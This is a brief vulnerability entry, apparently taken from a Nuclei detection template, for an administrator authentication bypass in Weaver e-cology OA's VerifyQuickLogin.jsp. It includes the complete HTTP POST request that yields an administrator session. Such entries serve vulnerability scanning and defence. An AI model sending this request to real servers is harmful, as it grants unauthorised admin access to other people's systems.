# Vulnerability: Weaver e-cology verifyquicklogin.jsp - Auth Bypass
**Classification:** ECOLOGY
**Source:** Nuclei Template (`ecology-verifyquicklogin-auth-bypass.yaml`)

## Description
There is an arbitrary administrator login vulnerability in the Panwei OA E-Cology VerifyQuickLogin.jsp file. An attacker can obtain the administrator Session by sending a special request package.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /mobile/plugin/VerifyQuickLogin.jsp HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

identifier=1&language=1&ipaddress=x.x.x.x
```

